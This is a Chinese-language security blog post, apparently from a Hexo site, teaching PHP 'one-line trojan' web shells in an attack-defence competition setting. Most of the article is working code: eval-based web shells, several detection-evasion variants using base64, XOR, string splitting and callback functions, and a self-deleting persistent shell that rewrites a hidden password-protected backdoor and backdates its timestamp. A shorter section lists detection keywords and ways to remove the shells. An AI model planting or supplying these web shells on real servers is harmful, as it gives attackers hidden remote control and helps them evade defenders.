@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="����,Tianze" />
+   
+  <meta name="description" content="����˳Ӧ δ����ӭ ��ʱ���� �ȹ����� &#39;&#39;" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    一句话木马 |  Tianze&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Tianze's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-一句话木马" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  一句话木马
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/03/01/yijuhua/" class="article-date">
+  <time datetime="2021-03-01T13:59:17.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">9 min</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <h2 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h2><p>一句话木马是一个可执行脚本文件，把脚本文件上传到目标服务器，然后文件被解析执行就可以达到控制目标服务器的目的。<a id="more"></a></p>
+<p>之所以叫一句话，是因为它短小精悍，它的类型也有很多种，比如php、jsp、asp等等，看网站用的是哪种语言就用哪种类型的木马。</p>
+<p>可能是php用的比较多，所以下面都是关于php的讲解</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h3><p><code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>或者</p>
+<p><code>&lt;?php @eval($_GET[&#39;a&#39;]);?&gt;</code></p>
+<p>PHP服务器识别到&lt;?php这个代码才会去解析执行，@来屏蔽错误，增加其隐蔽性，然后通过eval()函数执行变量a里面的内容</p>
+<p>用get或者post传入参数a=phpinfo();后就变成</p>
+<p><code>&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;</code></p>
+<p>想要执行什么代码，就把什么代码传给变量a即可</p>
+<h3 id="上传木马攻击成功需要满足三个条件"><a href="#上传木马攻击成功需要满足三个条件" class="headerlink" title="上传木马攻击成功需要满足三个条件"></a>上传木马攻击成功需要满足三个条件</h3><p>木马能成功上传到服务器</p>
+<p>知道木马在服务器的路径</p>
+<p>上传的木马能被解析执行</p>
+<h3 id="eval和assert的异同"><a href="#eval和assert的异同" class="headerlink" title="eval和assert的异同"></a>eval和assert的异同</h3><p>相同点：都能把字符串作为PHP代码执行</p>
+<p>不同点：eval()不能被<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a>调用，eval()函数实际是一个语言构造器，相当于C语言中的预定义宏，属于PHP语言内部关键字</p>
+<p>可变函数：PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
+<p>可变函数不能用于例如 <a href="https://www.php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a>，<a href="https://www.php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a>，<a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a>，<a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a>，<a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a>，<a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a>，<a href="https://www.php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a> 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&quot;eval&quot;</span><br><span class="line">@$a(@$_REQUEST[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br><span class="line">这样是不行的</span><br></pre></td></tr></table></figure>
+
+<p>注：php7.1以上assert已经被废弃</p>
+<h2 id="木马的各种变形"><a href="#木马的各种变形" class="headerlink" title="木马的各种变形"></a>木马的各种变形</h2><p>传统的木马防护检测一般是基于特征检测的防护，如：正则表达式和黑名单。</p>
+<h3 id="传统防护检测的免杀方法："><a href="#传统防护检测的免杀方法：" class="headerlink" title="传统防护检测的免杀方法："></a>传统防护检测的免杀方法：</h3><h4 id="思路一：隐藏关键字"><a href="#思路一：隐藏关键字" class="headerlink" title="思路一：隐藏关键字"></a>思路一：隐藏关键字</h4><p>绕过php代码标志&lt;?的限制：</p>
+<p><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;X&#39;])&lt;/script&gt;</code></p>
+<p>拆分拼接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr&#x3D;explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); &#x2F;&#x2F;把字符串打散为数组</span><br><span class="line">$payload&#x3D;$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];&#x2F;&#x2F;拼接成assert</span><br><span class="line">&#x2F;&#x2F;php版本要求:&lt;&#x3D;7.0</span><br><span class="line">@$payload(@$_GET[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">    @$a($_POST(&#39;cmd&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随机异或，用异或运算来组成字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;也可以用十六进制进行进一步加密,例如</span><br><span class="line">&#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;;</span><br><span class="line">$a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a</span><br><span class="line">$b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s</span><br><span class="line">$c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e</span><br><span class="line">$d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r</span><br><span class="line">$e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t</span><br><span class="line">$payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert</span><br><span class="line">@$payload(@$_POST[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可变函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可变变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&#39;assert&#39;;</span><br><span class="line">$b&#x3D;&#39;a&#39;;</span><br><span class="line">&#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39;</span><br><span class="line">$$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="思路二：回调函数"><a href="#思路二：回调函数" class="headerlink" title="思路二：回调函数"></a>思路二：回调函数</h4><p>回调函数：PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。<br>如：call_user_func ( $callback , $parameter)</p>
+<p>$callback ：被调用的回调函数<br>$parameter：0个或以上的参数，被传入回调函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@call_user_func($_GET[&#39;id&#39;],$_POST[&#39;a&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其他回调函数：<br>call_user_func_array、array_filter、<br>register_tick_function、<br>forward_static_call、<br>………………</p>
+<p>PHP手册关键字搜索回调函数：called,callable,callback………..</p>
+<h2 id="木马的使用"><a href="#木马的使用" class="headerlink" title="木马的使用"></a>木马的使用</h2><p>1.执行系统命令：</p>
+<p>system()–执行外部程序，并显示输出<br>passthru()–执行外部程序并且显示原始输出<br>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。<br>shell_exec()或放在反引号里–通过shell环境执行命令，需要echo</p>
+<p>2.读文件：</p>
+<p>file_ get_contents 一将整个文件读入为一个字符串<br>file()一把整个文件读入一个数组中<br>readfile一读取一个文件，并写入到输出缓冲</p>
+<p>3.遍历目录：</p>
+<p>scandir() 函数返回一个指定目录中的文件和目录的数组。</p>
+<h2 id="木马的特征与查杀-AWD"><a href="#木马的特征与查杀-AWD" class="headerlink" title="木马的特征与查杀(AWD)"></a>木马的特征与查杀(AWD)</h2><p>基于特征检测，检测敏感关键字，如：危险函数、特殊函数<br>工具：D盾</p>
+<p>1、代码执行函数：<br>eval<br>assert<br>preg_replace<br>create_function<br>回调函数 call_user_func、call_user_func_array、register_tick_function、array_filter等等</p>
+<p>2、命令执行函数：<br>exec()–执行一个外部程序<br>passthru()–执行外部程序并且显示原始输出<br>proc_open()–执行一个命令，并且打开用来输入/输出的文件指针<br>shell_exec()或放在两个反引号里–通过shell环境执行命令<br>system()–执行外部程序，并显示输出<br>popen()–通过参数传递一条命令，并对popen打开的文件执行</p>
+<p>3、文件操作函数：<br>file_ get_contents 一将整个文件读入为一个字符串<br>file_ put_ contents 一将一个字符串写入文件<br>file()一把整个文件读入一个数组中<br>fopen一打开文件或者URL<br>move_ uploaded file 一将上传的文件移动到新位置<br>readfile一读取一个文件，并写入到输出缓冲<br>rename一重命名一个文件或目录<br>rmdir一删除目录<br>unlink &amp; delete 一删除文件</p>
+<p>4、包含函数：<br>require、require_once<br>include、include_once</p>
+<p>5、特殊函数：<br>phpinfo<br>变量覆盖  parse_str、extract等等</p>
+<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file &#x3D; &#39;.&#x2F;.index1.php&#39;;&#x2F;&#x2F;.是隐藏文件</span><br><span class="line">$code &#x3D; &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])&#x3D;&#x3D;&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;;&#x2F;&#x2F;注：</span><br><span class="line">pass参数使用了MD5加密，防止木马被他人利用。</span><br><span class="line">&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command</span><br><span class="line">while (1)&#123;</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .index1.php&#39;);&#x2F;&#x2F;防守方可能会检查最近几分钟内修改或创建的文件，修改时间可能可以防止被检测出来</span><br><span class="line">	usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ignore_user_abort(true)：此函数用来设置 客户机断开后是否会终止脚本的执行，设置成true，客户机断开后脚本仍然会执行。<br>set_time_limit(0)：设置脚本最大执行时间，设为0表示没有限制。<br><code>unlink(__FILE__)</code>： 删除文件本身，起到隐蔽自身的作用。<br>usleep()：延迟执行当前脚本若干微秒。</p>
+<p>不死马的查杀：</p>
+<p>1、重启服务，比如php 等web服务。<br>2、创建一个和不死马同名的文件夹。<br>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID 杀掉进程。<br>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间才会有效。</p>
+<h2 id="菜刀蚁剑使用介绍"><a href="#菜刀蚁剑使用介绍" class="headerlink" title="菜刀蚁剑使用介绍"></a>菜刀蚁剑使用介绍</h2><p>小马：短小精悍，比如一句话木马，但实现的功能少；<br>大马：脚本大小会比较庞大，但它能实现更复杂的功能。<br>先传小马，再利用小马执行大马。菜刀、蚁剑等工具一键实现。</p>
+<p>1、工具原理：<br>假设上传的一句话木马为：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>蚁剑连接抓包：</p>
+<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210302151622814.png" alt="image-20210302151622814"></p>
+<p>发送的请求包中，cmd连接密码中再嵌套了一句eval函数，而真正传递命令的是随机参数，随机参数传递base64编码后的命令，传递给cmd后，进行了base64解码，服务器执行解码完的命令。</p>
+<p>把随机参数传递的命令解码后，如下：<br>大致意思为循环遍历路径下的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out)&#123;return $out;&#125;;</span><br><span class="line">function asoutput()&#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;2652a8a9cbcf&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;76c018cc86&quot;;&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try&#123;</span><br><span class="line">    $D&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">	if($D&#x3D;&#x3D;&quot;&quot;)$D&#x3D;dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">	$R&#x3D;&quot;&#123;$D&#125;	&quot;;</span><br><span class="line">	if(substr($D,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.&#x3D;&quot;&#123;$L&#125;:&quot;;&#125;</span><br><span class="line">	else&#123;$R.&#x3D;&quot;&#x2F;&quot;;&#125;</span><br><span class="line">	$R.&#x3D;&quot;	&quot;;</span><br><span class="line">	$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();</span><br><span class="line">	$R.&#x3D;php_uname();</span><br><span class="line">	$R.&#x3D;&quot;	&#123;$s&#125;&quot;;</span><br><span class="line">	echo $R;;</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=7</a></p>
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>Copyright： </strong>
+              Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2021/03/01/yijuhua/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2021/03/03/SSRF/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            浅谈SSRF
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/02/18/View-WiFi-password/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">命令查看连过的WIFI密码</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'monsterid',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2021
+        <i class="ri-heart-fill heart_icon"></i> Blog of Tianze
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Tianze&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/literature">文集</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/url">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/url">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['曾经沧海难为水，除却巫山不是云', '物来顺应，未来不迎，当时不杂，既过不恋', ''],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
+      showCursor: true
+    });
+  } catch (err) {
+  }
+
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
